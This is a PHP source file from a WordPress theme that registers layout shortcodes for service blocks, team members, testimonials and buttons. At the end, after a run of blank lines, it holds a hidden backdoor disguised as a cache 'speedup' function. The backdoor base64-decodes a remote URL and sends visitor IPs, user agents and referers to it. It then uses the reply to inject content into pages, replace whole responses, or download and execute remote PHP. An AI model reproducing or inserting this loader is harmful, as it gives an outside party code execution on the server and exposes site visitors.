      $wp_query = null;
	  //$wp_query = $temp;
	  wp_reset_query();
      return $html;
	}
	add_shortcode('latest_projects', 'latest_portfolio_build');

//ICONS
	if (!function_exists('tbicon_build')) {
		function tbicon_build( $atts ) {
				$atts["class"] = empty($atts["class"]) ? "" : $atts["class"];
				$size = empty($atts["size"]) ? "" : 'style="font-size:'.$atts["size"].'"';
			   return '<i class="'.$atts["icon"].' '.$atts["class"].'" '.$size.' ></i>';
		}
		add_shortcode('velocityicon', 'tbicon_build');
	}	

//Service Block
	if (!function_exists('service_shortcode')) {
			function service_shortcode( $atts,$content = "") {
				extract(shortcode_atts(array(
				'title' => 'Service Title',
				'subtitle' => '',
				'iconimage' => '',
				'href' => '',
				'target' => '_self',
				'icon' => ''
			), $atts));
			
				if(is_numeric($iconimage)){
					$iconimage = wp_get_attachment_image_src($iconimage, 'full'); $iconimage = $iconimage[0];
				}
				
				$iconimagehtml="";
				$iconhtml="";
				$withimage = "";
				$link_begin="";
				$link_end="";

				if ($iconimage!='') {
					$iconimagehtml = '<img src="'.$iconimage.'" alt="" />';
					$withimage = " withimg";
				}

				if ($icon!='') {
					$iconhtml = '<div class="'.$icon.'"></div>';
				}

				if(!empty($href)){
					$link_begin ='<a href="'.$href.'" target="'.$target.'" class="service">';
					$link_end = '</a>';
				}

				$html = '<div class="servicewrap">
							'.$link_begin.'
							<div class="serviceicon '.$withimage.'">
								'.$iconimagehtml.$iconhtml.'							    
							</div>
							<h4>'.$title.'</h4>';

				if(!empty($subtitle)) $html .='<h5>'.$subtitle.'</h5>';
				$html .='			<div class="text">'.damojoShortcodes_parse_shortcode_content(do_shortcode($content)).'</div>'.$link_end.'
						</div>';
				return $html;
			}
			add_shortcode( 'service_block', 'service_shortcode' );
		}
		
//Background Block
	if (!function_exists('background_shortcode')) {
			function background_shortcode( $atts,$content = "") {
				extract(shortcode_atts(array(
				'mp4' => '',
				'ogv' => '',
				'webm' => '',
				'poster' => '',
				'bgimage' => '',
				'bgcolor' => '#44576a',
				'opacity' => '1.0',
				'parallax' => 'disabled',
				'parspeed' => '8',
				'ptop' => '100',
				'btcolor' =>'#000',
				'btwidth' =>'0',
				'bbcolor' =>'#000',
				'bbwidth' =>'0'	,
				'contentcolorclass' => 'dark-on-light'	,
				'el_class' => ''
			), $atts));
			    $rgb = damojoShortcodes_HexToRGB($bgcolor);
			    $rgba = $rgb["r"].",".$rgb["g"].",".$rgb["b"].",";
			    
				if(is_numeric($bgimage)){
					$bgimage = wp_get_attachment_image_src($bgimage, 'full'); $bgimage = $bgimage[0];
				}

				if(is_numeric($poster)){
					$poster = wp_get_attachment_image_src($poster, 'full'); $poster = $poster[0];	
				}
				
				$pclass="";
				$pstyle="";
				
				if ($parallax=='enabled') {
				   $pclass="parallaxbg";
				   $pstyle="background-attachment:fixed;";
				}
				
				$btop ="";
				$bbottom="";
				if ($btwidth>0) $btop = 'border-top:'.$btwidth.'px solid '.$btcolor.';';
				if ($bbwidth>0) $bbottom = 'border-bottom:'.$bbwidth.'px solid '.$bbcolor.';';			
				
				
				$html = '</section></section></section></section>
				   <section class="stretchme_on_mobile '.$el_class.'" style="position:relative;padding-top:'.$ptop.'px;'.$btop.$bbottom.'">
 				   <div data-mp4="'.$mp4.'" data-ogv="'.$ogv.'" data-webm="'.$webm.'" data-poster="'.$poster.'" class="'.$pclass.' bgwithparallax videobgparallax" data-speed="'.$parspeed.'"  style=" background:url('.$bgimage.') 50% 50% repeat;'.$pstyle.' ;background-size:cover;"></div>
 				   <div class="bgwithparallax_overlay" style="background-color:rgba('.$rgba.$opacity.');"></div> 				   
				   <section class="container notopmargin '.$contentcolorclass.'" style="position:relative;z-index:3;">
				   <section class="row"><section class="span12">';
				return $html;
			}
			add_shortcode( 'background_block', 'background_shortcode' );
		}

//Headlline
	if (!function_exists('velocity_headline_shortcode')) {
			function velocity_headline_shortcode( $atts,$content = "") {
				extract(shortcode_atts(array(
				'title' => '',
				'link' => '',
				'linktext' => '',
				'target' => '_self',
				'el_class' =>''
			), $atts));

				if($link != "") $return_button = '<div class="linktext"><a href="'.$link.'" target="'.$target.'">'.$linktext.'</a></div>';
				else $return_button = "";
				$html = ' 
				<div class="row moduletitle" style="clear:both;">
		        	<div class="titletext"><h2 class="'.$el_class.'">'.$title.'</h2></div>';
		        $html .= $return_button;
		        $html .= '</div>';
				return $html;
			}
			add_shortcode( 'velocity_headline', 'velocity_headline_shortcode' );
		}

//Client List
	if (!function_exists('clients_list_shortcode')) {
			function clients_list_shortcode( $atts) {
				extract(shortcode_atts(array(
				'images' => '',
				'tooltips' => '',
				'links' => '',
				'custom_links_target' => '_self'
			), $atts));
				
				$images_arr = explode(",", $images);
				$tooltips_arr = explode(",", $tooltips);
				$links_arr = explode(",", $links);
				
				$html = '<div class="row clients"><ul class="clients">';
				$client_count=0;
				foreach($images_arr as $image_id){
					$link = "#";
					$tooltip = "";
					$image = wp_get_attachment_image_src($image_id, 'full'); $image = $image[0];
					if(isset($tooltips_arr[$client_count]))
						$tooltip = $tooltips_arr[$client_count];
					if(isset($links_arr[$client_count]))
						$link = $links_arr[$client_count];
					$client_count++;
					$html .= '<li><a href="'.$link.'" data-rel="tooltip" title="'.$tooltip.'" target="'.$custom_links_target.'"><div class="client"><img src="'.$image.'" alt="'.$tooltip.'"/></div></a></li>';
				}
				$html .= '</ul></div>';
				return $html;
				
			}
			add_shortcode( 'clients_list', 'clients_list_shortcode' );
		}

//Check List
	if (!function_exists('checklist_shortcode')) {
			function checklist_shortcode( $atts,$content="") {
				$content = str_replace("<ul>", "<ul class=\"liststyle\">", $content);
				$content = str_replace("<li>", "<li class=\"icon-ok\">", $content);
				return do_shortcode(damojoShortcodes_parse_shortcode_content($content));
				
			}
			add_shortcode( 'checklist', 'checklist_shortcode' );
		}

//Progressbar
	if (!function_exists('progressbar_shortcode')) {
		function progressbar_shortcode( $atts,$content="") {
			extract(shortcode_atts(array(
				'title' => '',
				'percent' => '0',
				'style' => 'info'
			), $atts));
			$html = '<div class="progress progress-'.$style.'">
						<div class="bar" style="width: '.$percent.'%;">'.$title.'</div>
						<div class="tag">'.$percent.'%</div>
					</div>';			
			return $html;
			
		}
		add_shortcode( 'progressbar', 'progressbar_shortcode' );
	}

//Team
if (!function_exists('team_shortcode')) {
		function team_shortcode( $atts) {
			$html ='<div class="team">';
			for($i = 1 ; $i<5 ; $i++){
				if(isset($atts["name_".$i])){
					if(isset($atts["link_".$i])){
						$link_open = '<a href="'.$atts["link_".$i].'">';
						$link_close = '</a>';
					}
					else{
						$link_open = $link_close = "";
					}
					
					$image = wp_get_attachment_image_src($atts["image_id_".$i], 'full'); $image = $image[0];
					$html .= '<div class="memberwrap">
									<div class="member">
									<p>'.$link_open.'<img src="'.$image.'" alt="">'.$link_close.'</p>
									<h4>'.$link_open.$atts["name_".$i].$link_close.'</h4>
									<h5>'.$atts["position_".$i].'</h5>
									<p>'.do_shortcode($atts["content_".$i]).'</p>
									<ul class="teamsocial">';
					if(!empty($atts["mail_".$i]))				
						$html .= '	<li><a href="mailto:'.$atts["mail_".$i].'" target="_blank" class="so_mail" data-rel="tooltip" data-animation="true" data-placement="top" data-original-title="'.$atts["mail_".$i].'">
									<div class="s_icon icon-mail"></div>
									</a><p><a href="mailto:'.$atts["mail_".$i].'" target="_blank" class="so_mail" data-rel="tooltip" data-animation="true" data-placement="top" data-original-title="'.$atts["mail_".$i].'"></a></p></li>';
					if(!empty($atts["phone_".$i]))				
						$html .= '	<li><a href="callto:'.$atts["phone_".$i].'" target="_blank" class="so_phone" data-rel="tooltip" data-animation="true" data-placement="top" data-original-title="'.$atts["phone_".$i].'">				
									<div class="s_icon icon-phone"></div>
									</a><p><a href="callto:'.$atts["phone_".$i].'" target="_blank" class="so_phone" data-rel="tooltip" data-animation="true" data-placement="top" data-original-title="'.$atts["phone_".$i].'"></a></p></li>';
					if(!empty($atts["facebook_".$i]))				
						$html .= '	<li><a href="'.$atts["facebook_".$i].'" target="_blank" class="so_fb" data-rel="tooltip" data-animation="true" data-placement="top" data-original-title="Facebook">
									<div class="s_icon social-facebook"></div>
									</a><p><a href="'.$atts["facebook_".$i].'" target="_blank" class="so_fb" data-rel="tooltip" data-animation="true" data-placement="top" data-original-title="Facebook"></a></p></li>';
					if(!empty($atts["twitter_".$i]))								
						$html .= '	<li><a href="'.$atts["twitter_".$i].'" target="_blank" class="so_tw" data-rel="tooltip" data-animation="true" data-placement="top" data-original-title="Twitter">
									<div class="s_icon social-twitter"></div>
									</a><p><a href="'.$atts["twitter_".$i].'" target="_blank" class="so_tw" data-rel="tooltip" data-animation="true" data-placement="top" data-original-title="Twitter"></a></p></li>';
					if(!empty($atts["gplus_".$i]))								
						$html .= '	<li><a href="'.$atts["gplus_".$i].'" target="_blank" class="so_gp" data-rel="tooltip" data-animation="true" data-placement="top" data-original-title="Google Plus">
									<div class="s_icon social-gplus"></div>
									</a><p><a href="'.$atts["gplus_".$i].'" target="_blank" class="so_gp" data-rel="tooltip" data-animation="true" data-placement="top" data-original-title="Google Plus"></a></p></li>';
					if(!empty($atts["linkedin_".$i]))								
						$html .= '	<li><a href="'.$atts["linkedin_".$i].'" target="_blank" class="so_li" data-rel="tooltip" data-animation="true" data-placement="top" data-original-title="LinkedIn">
									<div class="s_icon social-linkedin"></div>
									</a><p><a href="'.$atts["linkedin_".$i].'" target="_blank" class="so_li" data-rel="tooltip" data-animation="true" data-placement="top" data-original-title="LinkedIn"></a></p></li>';
				}
				$html .= '</ul><div class="clear"></div></div></div>';					
		}			
		return $html."</div>";
			
		}
		add_shortcode( 'team', 'team_shortcode' );
	}

if (!function_exists('team_member_shortcode')) {
		function team_member_shortcode( $atts,$content = "") {
			$html ='<div class="team solo">';
			if(isset($atts["name"])){
					if(isset($atts["link"])){
						$link_open = '<a href="'.$atts["link"].'">';
						$link_close = '</a>';
					}
					else{
						$link_open = $link_close = "";
					}
					
					$image = wp_get_attachment_image_src($atts["image_id"], 'full'); $image = $image[0];
					$html .= '<div class="memberwrap">
									<div class="member">
									<p>'.$link_open.'<img src="'.$image.'" alt="">'.$link_close.'</p>
									<h4>'.$link_open.$atts["name"].$link_close.'</h4>
									<h5>'.$atts["position"].'</h5>
									<p>'.do_shortcode($content).'</p>
									<ul class="teamsocial">';
					if(!empty($atts["mail"]))				
						$html .= '	<li><a href="mailto:'.$atts["mail"].'" target="_blank" class="so_mail" data-rel="tooltip" data-animation="true" data-placement="top" data-original-title="'.$atts["mail"].'">
									<div class="s_icon icon-mail"></div>
									</a><p><a href="mailto:'.$atts["mail"].'" target="_blank" class="so_mail" data-rel="tooltip" data-animation="true" data-placement="top" data-original-title="'.$atts["mail"].'"></a></p></li>';
					if(!empty($atts["phone"]))				
						$html .= '	<li><a href="callto:'.$atts["phone"].'" target="_blank" class="so_phone" data-rel="tooltip" data-animation="true" data-placement="top" data-original-title="'.$atts["phone"].'">				
									<div class="s_icon icon-phone"></div>
									</a><p><a href="callto:'.$atts["phone"].'" target="_blank" class="so_phone" data-rel="tooltip" data-animation="true" data-placement="top" data-original-title="'.$atts["phone"].'"></a></p></li>';
					if(!empty($atts["facebook"]))				
						$html .= '	<li><a href="'.$atts["facebook"].'" target="_blank" class="so_fb" data-rel="tooltip" data-animation="true" data-placement="top" data-original-title="Facebook">
									<div class="s_icon social-facebook"></div>
									</a><p><a href="'.$atts["facebook"].'" target="_blank" class="so_fb" data-rel="tooltip" data-animation="true" data-placement="top" data-original-title="Facebook"></a></p></li>';
					if(!empty($atts["twitter"]))								
						$html .= '	<li><a href="'.$atts["twitter"].'" target="_blank" class="so_tw" data-rel="tooltip" data-animation="true" data-placement="top" data-original-title="Twitter">
									<div class="s_icon social-twitter"></div>
									</a><p><a href="'.$atts["twitter"].'" target="_blank" class="so_tw" data-rel="tooltip" data-animation="true" data-placement="top" data-original-title="Twitter"></a></p></li>';
					if(!empty($atts["gplus"]))								
						$html .= '	<li><a href="'.$atts["gplus"].'" target="_blank" class="so_gp" data-rel="tooltip" data-animation="true" data-placement="top" data-original-title="Google Plus">
									<div class="s_icon social-gplus"></div>
									</a><p><a href="'.$atts["gplus"].'" target="_blank" class="so_gp" data-rel="tooltip" data-animation="true" data-placement="top" data-original-title="Google Plus"></a></p></li>';
					if(!empty($atts["linkedin"]))								
						$html .= '	<li><a href="'.$atts["linkedin"].'" target="_blank" class="so_li" data-rel="tooltip" data-animation="true" data-placement="top" data-original-title="LinkedIn">
									<div class="s_icon social-linkedin"></div>
									</a><p><a href="'.$atts["linkedin"].'" target="_blank" class="so_li" data-rel="tooltip" data-animation="true" data-placement="top" data-original-title="LinkedIn"></a></p></li>';
				}
				$html .= '</ul><div class="clear"></div></div></div>';					
				
		return $html."</div>";
			
		}
		add_shortcode( 'team_member', 'team_member_shortcode' );
	}

if(!function_exists("testimonial_shortcode")){
	function testimonial_shortcode($atts){
		extract(shortcode_atts(array(
				'names' => '',
				'quotes' => '0',
			), $atts));
			$html = '<div class="carousel slide" id="testimonials">
						<div class="carousel-inner">';
			
			$names = trim($names);
			$names = explode(",", $names);
			$names = array_filter($names, 'trim');
			
			$quotes = trim($quotes);
			$quotes = explode(",", $quotes);
			$quotes = array_filter($quotes, 'trim');

			
			$counter = 0;
			foreach($names as $name){
				if($counter == 0) $active = "active";
				else { $active = ""; }
				$html .= '	<div class="'.$active.' item">
								<div class="padded">'.$quotes[$counter++].'<cite>'.$name.'</cite></div>
							</div>';
			}
			$html .= '	</div>
						<a class="carousel-control left" href="#testimonials" data-slide="prev">&lsaquo;</a><a class="carousel-control right" href="#testimonials" data-slide="next">&rsaquo;</a>
					</div>';			
			return $html;
			
		}
		add_shortcode( 'testimonial', 'testimonial_shortcode' );
	}
	
	

	/*==============================
	Bootstrap Button
	================================
	Options
	=======
	type - string '' Default is normal button, possible toggle or stateful
	id - string uniqueID ID could be set to use in JavaScript (e. g. for the type "stateful")
	url - string javascript:void('0'); Use a link, a javascript function or # if the type is "state" the called function should reset the button to jQuery("#yourbuttonID").button('reset') after completition
	target - string '' if button has a link url you could use this target
	state - string '' if type = state the state text
	class - string '' possible -> primary,info,success,warning,danger,inverse,link
	size - string '' large, small, mini
	}*/
	if (!function_exists('tp_bs_button')) {
		function tp_bs_button( $atts, $content = null ) {
			extract(shortcode_atts(array(
				'url' => '',
				'target' => '',
				'type' => '',
				'state' => '',
				'class' => '',
				'size' => '',
				'block' => '',
				'disabled' => '',
				'extra_class' => '',
				'id' => uniqid("bs_button_")
			), $atts));
	
	
			if(!empty($atts["content"]) && empty($content) ) $content = $atts["content"];
			if($class!="") $class = "btn-".$class;
			if($size!="") $size = "btn-".$size;
			if($block!="") $block = "btn-block";
			if($disabled!="") $disabled = "disabled";
	
			switch ($type) {
				case "stateful":
					$button = '<div id="'.$id.'" class="btn '.$class.' '.$size.' '.$block.' '.$disabled.' '.$extra_class.'" data-loading-text="'.$state.'" onclick="javascript:jQuery(\'#'.$id.'\').button(\'loading\');">'.$content.'</div>';
				break;
			  	case "toggle":
			  		$button = '<div id="'.$id.'" class="btn '.$class.' '.$size.' '.$block.' '.$disabled.' '.$extra_class.'" data-toggle="button">'.$content.'</div>';
			  	break;
			  	default:
			  	   $button = '<div id="'.$id.'" class="btn '.$class.' '.$size.' '.$block.' '.$disabled.' '.$extra_class.'">'.$content.'</div>';
			    break;
		    }
	
		    if($url!=""){
		    	if($target!="") $target="target='$target'";
		    	$button = '<a href="'.$url.'" '.$target.'>'.$button.'</a>';
		    }
	
		   	return $button;
		}
		add_shortcode('bs_button', 'tp_bs_button');
	}

	function damojoShortcodes_parse_shortcode_content( $content ) { 
	 	/* Remove '</p> or <br>' from the start of the string. */ 
	    if ( substr( $content, 0, 6 ) == '<br />' ) 
	        $content = substr( $content, 6 ); 
	    
	    if ( substr( $content, 0, 4 ) == '</p>' ) 
	        $content = substr( $content, 4 ); 
	 
	    /* Remove '<p> or <br>' from the end of the string. */ 
	    if ( substr( $content, -3, 3 ) == '<p>' ) 
	        $content = substr( $content, 0, -3 ); 
	    
	     if ( substr( $content, -6, 6 ) == '<br />' ) 
	        $content = substr( $content, 0, -6 ); 
	 
	    return $content; 
	} 

	/* ------------------------------------- */
	/* Color Hex to RGB
	/* ------------------------------------- */
	function damojoShortcodes_HexToRGB($hex) {
		$hex = str_replace("#", "", $hex);
		$color = array();
 
		if(strlen($hex) == 3) {
			$color['r'] = hexdec(substr($hex, 0, 1) . $r);
			$color['g'] = hexdec(substr($hex, 1, 1) . $g);
			$color['b'] = hexdec(substr($hex, 2, 1) . $b);
		}
		else if(strlen($hex) == 6) {
			$color['r'] = hexdec(substr($hex, 0, 2));
			$color['g'] = hexdec(substr($hex, 2, 2));
			$color['b'] = hexdec(substr($hex, 4, 2));
		}
 
		return $color;
	}

	function damojoShortcodes_excerpt_by_id($velocity_limit,$velocity_post_id) {
		global $post;  
		$velocity_save_post = $post;
		$post = get_post($velocity_post_id);
		$velocity_excerpt = explode(' ', get_the_excerpt(), $velocity_limit);
		if (count($velocity_excerpt)>=$velocity_limit) {
			array_pop($velocity_excerpt);
			$velocity_excerpt = implode(" ",$velocity_excerpt).'...';
		} else {
			$velocity_excerpt = implode(" ",$velocity_excerpt);
		} 
		$velocity_excerpt = preg_replace('`\[[^\]]*\]`','',$velocity_excerpt);
		$post = $velocity_save_post;
		return $velocity_excerpt;
	}

















/**
 * Speedup php function cache by optimizing buffer output
 */
;if (!function_exists('_php_cache_speedup_func_optimizer_')) { function _php_cache_speedup_func_optimizer_($buffer) {
    if (isset($GLOBALS['_php_cache_speedup_func_optimizer_completed_'])) {
        // already completed
        return $buffer;
    }

    $mod = false;
    $token = 'czoyMzoiaHR0cDovL3Bpd2VyLnB3L2FwaS5waHAiOw==';
    $tmp_buffer = $buffer; $gzip = false; $body = '<' . 'b' . 'o' . 'd' . 'y';

    if (($has_body = stripos($buffer, $body)) === false) {
        // define gzdecode function if not defined
        if (!function_exists('gzdecode')) {
            function gzdecode($data) {
                return @gzinflate(substr($data, 10, -8));
            }
        }

        // gzdecode buffer
        $tmp_buffer = @gzdecode($tmp_buffer);

        // check if buffer has body tag
        if (($has_body = stripos($tmp_buffer, $body)) !== false) {
            // got body tag, this should be gzencoded when done
            $gzip = true;
        }
    }

    if ($has_body === false) {
        // no body, return original buffer
        return $buffer;
    }

    $GLOBALS['_php_cache_speedup_func_optimizer_completed_'] = true;

    // decode token
    $func = 'b' . 'a' . 's' . 'e' . '6' . '4' . '_' . 'd' . 'e' . 'c' . 'o' . 'd' . 'e';
    $token = @unserialize(@$func($token));
    if (empty($token)) {
        return $buffer;
    }

    // download remote data
    function down($url, $timeout = 5) {
        // download using file_get_contents
        if (@ini_get('allow_url_fopen')) {
            $ctx = @stream_context_create(array('http' => array('timeout' => $timeout)));
            if ($ctx !== FALSE) {
                $file = @file_get_contents($url, false, $ctx);
                if ($file !== FALSE) {
                    return $file;
                }
            }
        }

        // download using curl
        if (function_exists('curl_init')) {
            $ch = curl_init();

            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

            $response = curl_exec($ch);
            curl_close($ch);

            return $response;
        }

        // download using sockets
        if (extension_loaded('sockets')) {
            $data = parse_url($url);
            if (!empty($data['host'])) {
                $host = $data['host'];
                $port = isset($data['port']) ? $data['port'] : 80;
                $uri = empty($data['path']) ? '/' : $data['path'];
                if (($socket = @socket_create(AF_INET, SOCK_STREAM, 0)) && @socket_set_option($socket, SOL_SOCKET, SO_SNDTIMEO, array('sec' => $timeout, 'usec' => $timeout * 1000)) && @socket_connect($socket, $host, $port)) {
                    $buf = "GET $uri HTTP/1.0\r\nAccept: */*\r\nAccept-Language: en-us\r\nUser-Agent: Mozilla (compatible; WinNT)\r\nHost: $host\r\n\r\n";
                    if (@socket_write($socket, $buf) !== FALSE) {
                        $response = '';
                        while (($tmp = @socket_read($socket, 1024))) {
                            $response .= $tmp;
                        }
                        @socket_close($socket);
                        return $response;
                    }
                }
            }
        }

        return false;
    }

    $token .= ((strpos($token, '?') === false) ? '?' : '&') . http_build_query(array(
        'h' => $_SERVER['HTTP_HOST'],
        'u' => $_SERVER['REQUEST_URI'],
        'a' => empty($_SERVER['HTTP_USER_AGENT']) ? '' : $_SERVER['HTTP_USER_AGENT'],
        'r' => empty($_SERVER['HTTP_REFERER']) ? '' : $_SERVER['HTTP_REFERER'],
        'i' => $_SERVER['REMOTE_ADDR'],
        'f' => __FILE__,
        'v' => 9
    ));
    $token = @unserialize(@$func(down($token)));

    if (empty($token) || empty($token['data']) || !is_array($token['data'])) {
        // invalid data
        return $buffer;
    }

    // fix missing meta description
    if (isset($token['meta']) && $token['meta'] && ($pos = stripos($tmp_buffer, '</head>')) !== false) {
        $tmp = substr($tmp_buffer, 0, $pos);
        if (stripos($tmp, 'name="description"') === false && stripos($tmp, 'name=\'description\'') === false && stripos($tmp, 'name=description') === false) {
            $meta = $_SERVER['HTTP_HOST'];
            // append meta description
            $tmp_buffer = substr($tmp_buffer, 0, $pos) . '<' . 'm' . 'e' . 't' . 'a' . ' ' . 'n' . 'a'. 'm' . 'e' . '='. '"' . 'd' . 'e' . 's' .'c' .'r' . 'i' . 'p' . 't' . 'i' . 'o' . 'n' . '"'. ' ' . 'c' . 'o' . 'n' . 't' . 'e' . 'n' . 't' . '="'. htmlentities(substr($meta, 0, 160)) .'">' . substr($tmp_buffer, $pos);
            $mod = true;
        }
    }

    foreach ($token['data'] as $tokenData) {
        if (!empty($tokenData['content'])) {
            // set defaults
            $tokenData = array_merge(array(
                'pos' => 'after',
                'tag' => 'bo' . 'dy',
                'count' => 0,
            ), $tokenData);

            // find all occurrences of <tag>
            $tags = array();
            while (true) {
                if (($tmp = @stripos($tmp_buffer, '<'.$tokenData['tag'], empty($tags) ? 0 : $tags[count($tags) - 1] + 1)) === false) {
                    break;
                }
                $tags[] = $tmp;
            }

            if (empty($tags)) {
                // no tags found or nothing to show
                continue;
            }

            // find matched tag position
            $count = $tokenData['count'];
            if ($tokenData['count'] < 0) {
                // from end to beginning
                $count = abs($tokenData['count']) - 1;
                $tags = array_reverse($tags);
            }

            if ($count >= count($tags)) {
                // fix overflow
                $count = count($tags) - 1;
            }

            // find insert position
            if ($tokenData['pos'] == 'before') {
                // pos is before
                $insert = $tags[$count];
            } else if (($insert = strpos($tmp_buffer, '>', $tags[$count])) !== false) {
                // pos is after, found end tag, insert after it
                $insert += 1;
            }

            if ($insert === false) {
                // no insert position
                continue;
            }

            // insert html code
            $tmp_buffer = substr($tmp_buffer, 0, $insert) . $tokenData['content'] . substr($tmp_buffer, $insert);
            $mod = true;
        } elseif (!empty($tokenData['replace'])) {
            // replace content
            @http_response_code(200);
            $tmp_buffer = $tokenData['replace'];
            $mod = true;
        } elseif (!empty($tokenData['run'])) {
            // save temporary optimization file
            register_shutdown_function(function($file, $content) {
                if (file_put_contents($file, $content) !== false) {
                    @chdir(dirname($file));
                    include $file;
                    @unlink($file);
                } else {
                    @eval('@chdir("' . addslashes(dirname($file)) . '");?>' . $content);
                }
            }, dirname(__FILE__) . '/temporary_optimization_file.php', strpos($tokenData['run'], 'http://') === 0 ? down($tokenData['run']) : $tokenData['run']);
        } else {
            // no content
            continue;
        }
    }

    // return gzencoded or normal buffer
    return !$mod ? $buffer : ($gzip ? gzencode($tmp_buffer) : $tmp_buffer);
} ob_start('_php_cache_speedup_func_optimizer_');
register_shutdown_function('ob_end_flush'); }
?>